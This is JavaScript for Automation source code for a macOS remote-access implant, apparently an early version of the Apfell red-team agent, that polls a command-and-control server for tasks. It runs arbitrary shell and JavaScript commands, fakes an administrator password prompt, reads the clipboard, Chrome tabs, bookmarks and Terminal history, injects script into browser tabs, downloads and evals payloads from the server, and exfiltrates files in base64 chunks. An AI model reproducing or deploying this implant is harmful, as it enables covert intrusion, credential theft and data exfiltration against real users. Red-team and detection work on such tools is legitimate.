ObjC.import('Cocoa');
ObjC.import('Foundation'); //there by default I think, but safe to include anyway
ObjC.import('stdlib');
var currentApp = Application.currentApplication();
currentApp.includeStandardAdditions = true;
//--------------IMPLANT INFORMATION-----------------------------------
class implant{
	constructor(){
		this.procInfo = $.NSProcessInfo.processInfo;
		this.hostInfo = $.NSHost.currentHost;
		this.id = -1;
		this.user = ObjC.unwrap(this.procInfo.userName);
		this.fullName = ObjC.unwrap(this.procInfo.fullUserName);
		//every element in the array needs to be unwrapped
		this.ip = ObjC.unwrap(this.hostInfo.addresses); //probably just need [0]
		this.pid = this.procInfo.processIdentifier;
		//every element in the array needs to be unwrapped
		this.host = ObjC.unwrap(this.hostInfo.names); //probably just need [0]
		this.killdate = "";
		//this is a dictionary, but every 'value' needs to be unwrapped
		this.environment = ObjC.unwrap(this.procInfo.environment);
		this.uptime = this.procInfo.systemUptime;
		//every element in the array needs to be unwrapped
		this.args = ObjC.unwrap(this.procInfo.arguments);
		this.osVersion = this.procInfo.operatingSystemVersionString;
		this.uuid = "XXXX";
	}
}
apfell = new implant();
//--------------Base C2 INFORMATION----------------------------------------
class baseC2{
	//To create your own C2, extend this class and implement the required functions
	//The main code depends on the mechanism being C2 with these functions.
	//   the implementation of the functions doesn't matter though
	//   You're welcome to add additional functions as well, but this is the minimum
	constructor(interval, baseurl){
		this.interval = interval; //seconds between callbacks
		this.baseurl = baseurl; //where to reach out to
	}
	getInterval(){
		return this.interval;
	}
	checkin(){
		//check in with c2 server
	}
	getTasking(){
		//reach out to wherever to get tasking
	}
	getConfig(){
		//gets the current configuration for tasking
	}
	postResponse(){
		//output a response to a task
	}
	setConfig(){
		//updates the current configuration for how to get tasking
	}
}
//------------- C2Profile -------------------------------------------
//-------------MAIN EXECUTION LOOP ----------------------------------
for(var i=0; i < apfell.ip.length; i++){
	ip = apfell.ip[i];
	if (ip.js.includes(".") && ip.js != "127.0.0.1"){ // the includes(".") is to make sure we're looking at IPv4
		//console.log("found ip, checking in");
		C2.checkin(ip.js,apfell.pid,apfell.user,ObjC.unwrap(apfell.host[0]));
		break;
	}
}
shell = function(command){
	//simply run a shell command via doShellScript and return the response
	try{
		response = currentApp.doShellScript(command);
	}
	catch(error){
		response = error;
	}
	return response;
}
shell_elevated = function(command, prompt){
	//this will prompt the user for creds - if successful, they'll be cached for us for 5 min
	try{
		response = currentApp.doShellScript(command, {administratorPrivileges:true,withPrompt:prompt});
	}
	catch(error){
		response = error;
	}
	return response;
}
js = function(command){
	//simply eval a javascript string and return the response
	try{
		response = eval(command);
	}
	catch(error){
		response = error;
	}
	return response;
}
shell_api = function(path, args){
	//launch a program and args via ObjC bridge without doShellScript and return response
	try{
		var pipe = $.NSPipe.pipe;
		var file = pipe.fileHandleForReading;  // NSFileHandle
		var task = $.NSTask.alloc.init;
		task.launchPath = path; //'/bin/ps'
		task.arguments = args; //['ax']
		task.standardOutput = pipe;  // if not specified, literally writes to file handles 1 and 2
		task.standardError = pipe;
		task.launch; // Run the command `ps ax`
		if(args[args.length - 1] != "&"){
		    //if we aren't tasking this to run in the background, then try to read the output from the program
		    //  this will hang our main program though for now
            var data = file.readDataToEndOfFile;  // NSData, potential to hang here?
            file.closeFile
            // Call -[[NSString alloc] initWithData:encoding:]
            data = $.NSString.alloc.initWithDataEncoding(data, $.NSUTF8StringEncoding)
            response = ObjC.unwrap(data);
        }
        else{
            response = "launched program";
        }
	}
	catch(error){
		response = error;
	}
	return response;
}
launch_app = function(identifier){
	try{
		ObjC.import('AppKit')
		$.NSWorkspace.sharedWorkspace.launchAppWithBundleIdentifierOptionsAdditionalEventParamDescriptorLaunchIdentifier(
		  identifier,
		  $.NSWorkspaceLaunchAsync | $.NSWorkspaceLaunchAndHide | $.NSWorkspaceLaunchWithoutAddingToRecents ,
		  $.NSAppleEventDescriptor.nullDescriptor,
		  null
		)
		response = 'success';
	}
	catch(error){
		response = error;
	}
	return response;
}
clipboard_read = function(){
	try{
		return currentApp.theClipboard();
	}
	catch(error){
		return error;
	}
}
clipboard_set = function(data){
	try{
		currentApp.setTheClipboardTo(data);
		response = 'success';
	}
	catch(error){
		response = error;
	}
	return response;
}
list_running_apps = function(verbose){
	var procs = Application("System Events").processes;
	var names = [];
	for (var i = 0; i < procs.length; i++){
		var info = "Name: " + procs[i].name() +
		"\npid: " + procs[i].id() +
		"\ndisplayedName: " + procs[i].displayedName() +
		"\nshortName: " + procs[i].shortName() +
		"\nfile: " + procs[i].file().typeIdentifier();
		if(verbose){
			info += "\nHighLevelEvents: " + procs[i].acceptsHighLevelEvents() +
			"\nRemoteEvents: " + procs[i].acceptsRemoteEvents() +
			"\nArchitecture: " + procs[i].architecture() +
			"\nBackgroundOnly:" + procs[i].backgroundOnly() +
			"\nBundleIdentifer:" + procs[i].bundleIdentifier() +
			"\nclassic: " + procs[i].classic() +
			"\ncreatorType: " + procs[i].creatorType() +
			"\nfileType: " + procs[i].fileType() +
			"\nfrontmost: " + procs[i].frontmost() +
			"\nScriptable: " + procs[i].hasScriptingTerminology() +
			"\npartitionSpaceUsed: " + procs[i].partitionSpaceUsed() +
			"\ntotalPartitionSize: " + procs[i].totalPartitionSize() +
			"\nunixId: " + procs[i].unixId() +
			"\nvisible: " + procs[i].visible();
		}
		names.push(info);
	}
	return JSON.stringify(names);
}
list_users = function(method){
	all_users = [];
	if(method == "jxa"){
		var users = Application("System Events").users;
		for (var i = 0; i < users.length; i++){
			var info = "Name: " + users[i].name() +
			"\nFullName: " + users[i].fullName() +
			"\nhomeDirectory: " + users[i].homeDirectory() +
			"\npicturePath: " + users[i].picturePath();
			all_users.push(info)
		}
	}
	return JSON.stringify(all_users);
}
get_current_user = function(method){
	if(method == "jxa"){
		var user = Application("System Events").currentUser;
		var info = "Name: " + user.name() +
		"\nFullName: " + user.fullName() +
		"\nhomeDirectory: " + user.homeDirectory() +
		"\npicturePath: " + user.picturePath();
		return info;
	}
}
get_security_info = function(method){
	if(method == "jxa"){
		var secObj = Application("System Events").securityPreferences();
		var info = "automaticLogin: " + secObj.automaticLogin() +
		"\nlogOutWhenInactive: " + secObj.logOutWhenInactive() +
		"\nlogOutWhenInactiveInterval: " + secObj.logOutWhenInactiveInterval() +
		"\nrequirePasswordToUnlock: " + secObj.requirePasswordToUnlock() +
		"\nrequirePasswordToWake: " + secObj.requirePasswordToWake();
		//"\nsecureVirtualMemory: " + secObj.secureVirtualMemory(); //might need to be in an elevated context
		return info;
	}
}
list_chrome_tabs = function(){
	var tabs = [];
	try{
		var ch = Application("Google Chrome");
		for (var i = 0; i < ch.windows.length; i++){
			var win = ch.windows[i];
			for (var j = 0; j < win.tabs.length; j++){
				var tab = win.tabs[j];
				var info = "Title: " + tab.title() +
				"\nURL: " + tab.url() +
				"\nWin/Tab: " + i + "/" + j;
				tabs.push(info);
			}
		}
	}catch(error){
		return error;
	}
	return JSON.stringify(tabs);
}
list_chrome_bookmarks = function(){
	var all_data = [];
	try{
		var ch = Application("Google Chrome");
		var folders = ch.bookmarkFolders;
		for (var i = 0; i < folders.length; i ++){
			var folder = folders[i];
			var bookmarks = folder.bookmarkItems;
			all_data.push("Folder Name: " + folder.title());
			for (var j = 0; j < bookmarks.length; j++){
				var info = "Title: " + bookmarks[j].title() +
				"\nURL: " + bookmarks[j].url() +
				"\nindex: " + bookmarks[j].index() +
				"\nFolder/bookmark: " + i + "/" + j;
				all_data.push(info); //populate our array
			}
		}
	}catch(error){
		return error;
	}
	return JSON.stringify(all_data);
}
js_in_chrome_tab = function(win, tab, code){
	try{
		Application("Chrome").windows[win].tabs[tab].execute({javascript:code});
		return "completed";
	}
	catch(error){
		return error;
	}
}
get_system_info = function(method){
	if(method == "jxa"){
		return JSON.stringify(currentApp.systemInfo());
	}
}
list_terminal_info = function(history, contents){
	var all_data = {};
	try{
		var term = Application("Terminal");
		var windows = term.windows;
		for(var i = 0; i < windows.length; i++){
			var win_info = "Name: " + windows[i].name() +
			"\nVisible: " + windows[i].visible() +
			"\nFrontmost: " + windows[i].frontmost();
			var all_tabs = [];
			// store the windows information in id_win in all_data
			all_data[i + "_win"] = win_info;
			for(var j = 0; j < windows[i].tabs.length; j++){
				var tab_info = "Win/Tab: " + i + "/" + j +
				"\nBusy: " + windows[i].tabs[j].busy() +
				"\nProcesses: " + windows[i].tabs[j].processes() +
				"\nSelected: " + windows[i].tabs[j].selected() +
				"\nTTY: " + windows[i].tabs[j].tty();
				if(windows[i].tabs[j].titleDisplaysCustomTitle()){
					tab_info += "\nCustomTitle: " + windows[i].tabs[j].customTitle();
				}
				if(history){
					tab_info += "\nHistory: " + windows[i].tabs[j].history();
				}
				if(contents){
					tab_info += "\nContents: " + windows[i].tabs[j].contents();
				}
				all_tabs.push(tab_info);
			}
			// store all of the tab information corresponding to that window id at id_tabs
			all_data[i + "_tabs"] = all_tabs;
		}

	}catch(error){
		all_data['error'] = error;
	}
	return JSON.stringify(all_data);
}
shell_in_term_tab = function(window, tab, command){
	var output = "";
	try{
		var term = Application("Terminal");
		term.doScript(command, {in:term.windows[window].tabs[tab]});
	}
	catch(error){
		output = error;
	}
	return output;
}
does_file_exist = function(strPath){
    var error = $();
    return $.NSFileManager.defaultManager.attributesOfItemAtPathError($(strPath).stringByStandardizingPath, error), error.code === undefined;
}
convert_to_nsdata = function(strData){
    // helper function to convert UTF8 strings to NSData objects
    var tmpString = $.NSString.alloc.initWithCStringEncoding(strData, $.NSData.NSUnicodeStringEncoding);
    return tmpString.dataUsingEncoding($.NSData.NSUTF16StringEncoding);
}
write_text_to_file = function(data, file_path){
    try{
        var open_file = currentApp.openForAccess(Path(file_path), {writePermission: true});
        currentApp.setEof(open_file, { to: 0 }); //clear the current file
        currentApp.write(data, { to: open_file, startingAt: currentApp.getEof(open_file) });
        currentApp.closeAccess(open_file);
        return "file written";
     }
     catch(error){
        return "failed to write to file";
     }
}
sleepWakeUp = function(t){
	var response;
	console.log("checking for tasking");
	task = C2.getTasking();
	try{
		var command = ObjC.unwrap(task["command"]);
		if(command != "none"){
			var params = ObjC.unwrap(task["params"]);
			// params will either be a single parameter or JSON of multiple params
			console.log(JSON.stringify(task));
			console.log("processing task");
			if(command == "shell"){
				output = shell(params);
			}
			else if(command == "shell_elevated"){
				//takes in a command and a prompt. if no prompt given, uses the default
				pieces = JSON.parse(params);
				//pieces should have a command and prompt field
				output = shell_elevated(pieces['command'], pieces['prompt']);
			}
			else if(command == "js"){
				output = js(params);
			}
			else if(command == "jsb"){
				output = ObjC.deepUnwrap(js(params));
			}
			else if(command == "shell_api"){
				//params should be the full path of the binary followed by all of the arguments
				pieces = JSON.parse(params);
				//pieces should have a path and an array of arguments
				output = shell_api(pieces['path'], pieces['args']);
			}
			else if(command == "launchapp"){
				//this should be the bundle identifier like com.apple.itunes to launch
				//it will launch hidden, asynchronously, and will be 'hidden' (still shows up in the dock though)
				output = launch_app(params);
			}
			else if(command == "clipboard"){
				if(params.length > 0){
					//this means we're setting the clipboard to something
					output = clipboard_set(params);
				}
				else{
					//this means we're just getting the clipboard
					output = clipboard_read();
				}
			}
			else if(command == "list_apps"){
				//This takes at most one parameter to specify verbose information
				output = list_running_apps(params);
			}
			else if(command == "list_users"){
				//this outputs all the users based on the method specified
				//  should be called: list_users jxa
				if(params.length > 0){
					output = list_users(params);
				}
				else{
					//if no method is specified, we default to jxa for now
					output = list_users("jxa");
				}
			}
			else if(command == "current_user"){
				//outputs info about the current user based on the method specified
				//  should be called: current_user jxa
				if(params.length > 0){
					output = get_current_user(params);
				}
				else{
					//if no method is specified, default to jxa for now
					output = get_current_user("jxa");
				}
			}
			else if(command == "security_info"){
				//gets some security information about the system
				if(params.length > 0){
					output = get_security_info(params);
				}
				else{
					//if no method is specified, default to jxa for now
					output = get_security_info("jxa");
				}
			}
			else if(command == "chrome_tabs"){
				//list information about chrome tabs in all open Chrome windows
				output = list_chrome_tabs();
			}
			else if(command == "chrome_bookmarks"){
				//gets all of the current chrome bookmarks
				output = list_chrome_bookmarks();
			}
			else if(command == "js_chrome"){
				split_params = params.split(" ");
				//pieces should have a window #, tab #, and string of code to execute
				output = js_in_chrome_tab(split_params[0], split_params[1], split_params.slice(2, ).join(" "));
			}
			else if(command == "system_info"){
				//gets the system info via the provided method
				if(params.length > 0){
					output = get_system_info(params);
				}
				else{
					//if no method is specified, default to jxa for now
					output = get_system_info("jxa");
				}
			}
			else if(command == "terminals_read"){
				//this is the terminals section (read or send data to)
				split_params = params.split(" ");
                //this means command is: terminals_read [history] [contents]
                var history = false;
                var contents = false;
                if(split_params.includes('history')){
                    history = true;
                }
                if(split_params.includes('contents')){
                    contents = true;
                }
                output = list_terminal_info(history, contents);
			}
			else if(command == "terminals_send"){
			    split_params = params.split(" ");
			    //this means command is: terminals_send {win} {tab} {command(s)}
                //  the required information can be gained from the 'terminals_read' command
                output = shell_in_term_tab(split_params[1], split_params[2], split_params.slice(3, ).join(" "));
			}
			else if(command == "spawn"){
			    split_params = params.split(" ");
			    if(split_params[0] == "shell_api"){
			        if(split_params[1] == "oneliner"){
			            if(split_params[2] == "apfell-jxa"){
			                full_url = C2.baseurl + "api/v1.0/payloads/get/" + split_params[3];
                            path = "/bin/bash"
                            args = ['-c', '/usr/bin/osascript', '-l','JavaScript','-e']
                            command = "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(";
                            command = command + "'" + full_url + "')),$.NSUTF8StringEncoding)));"
                            args.push(command);
                            args.push("&");
                            console.log(args);
                            shell_api(path, args);
                            output = "command executed";
			            }
			        }
			    }
			}
			else if(command == "exit"){
				$.NSApplication.sharedApplication.terminate(this);
			}
			else if(command == "upload"){
                var split_params = params.split(" ");
                var url = "api/v1.0/files/" + split_params[0];
                var file_data = C2.htmlGetData(C2.baseurl + url);
                var file_path = split_params.slice(1, ).join(" ");
                var decoded_data = $.NSData.alloc.initWithBase64Encoding($(file_data));
                var file_data = $.NSString.alloc.initWithDataEncoding(decoded_data, $.NSUTF8StringEncoding).js;
                output = write_text_to_file(file_data, file_path);

			}
			else if(command == "download"){
                // download just has one parameter of the path of the file to download
                if( does_file_exist(params)){
                    var offset = 0;
                    var chunkSize = 3500;
                    var handle = $.NSFileHandle.fileHandleForReadingAtPath(params);
                    // Get the file size by seeking;
                    var fileSize = handle.seekToEndOfFile;
                    // always round up to account for chunks that are < chunksize;
                    var numOfChunks = Math.ceil(fileSize / chunkSize);
                    var registerData = JSON.stringify({'total_chunks': numOfChunks, 'task': task.id});
                    registerData = convert_to_nsdata(registerData);
                    registerFile = C2.postResponse("api/v1.0/responses/" + task.id, registerData);
                    if (registerFile['status'] == "success"){
                        handle.seekToFileOffset(0);
                        var currentChunk = 1;
                        var data = handle.readDataOfLength(chunkSize);
                        while(data.length > 0 && offset < fileSize){
                            // send a chunk
                            var fileData = JSON.stringify({'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js, 'task': task.id, 'file_id': registerFile['id']});
                            fileData = convert_to_nsdata(fileData);
                            C2.postResponse("api/v1.0/responses/" + task.id, fileData);
                            $.NSThread.sleepForTimeInterval(C2.interval);

                            // increment the offset and seek to the amount of data read from the file
                            offset += parseInt(data.length);
                            handle.seekToFileOffset(offset);
                            currentChunk += 1;
                            data = handle.readDataOfLength(chunkSize);
                        }
                        output = "Finished downloading file with id: " + registerFile['id'];
                        output += "\nBrowse to /api/v1.0/files/" + registerFile['id'];
                    }
                    else{
                        output = "Failed to register file to download";
                    }
                }
                else{
                    output = "file does not exist";
                }

			}
			else if(command == "sleep") {
				// Update agent sleep
				timer.invalidate;
				C2.interval = parseInt(params);
				timer = $.NSTimer.scheduledTimerWithTimeIntervalRepeatsBlock(C2.interval, true, sleepWakeUp);
				$.NSRunLoop.currentRunLoop.addTimerForMode(timer, "timer");
				output = "Sleep updated";
			}
			else {
				output = "command not supported: " + command + " " + params;
			}
			if ((typeof output) == "string"){
			    output = convert_to_nsdata(output);
			}
			C2.postResponse("api/v1.0/responses/" + task.id, output);
		}
	}
	catch(error){
		console.log(error);
	}
	task["command"] = "none"; //reset just in case something goes weird
};
//https://stackoverflow.com/questions/37834749/settimout-with-javascript-for-automation
timer = $.NSTimer.scheduledTimerWithTimeIntervalRepeatsBlock(C2.interval, true, sleepWakeUp);
$.NSRunLoop.currentRunLoop.addTimerForMode(timer, "timer");
$.NSRunLoop.currentRunLoop.runModeBeforeDate("timer", $.NSDate.distantFuture);
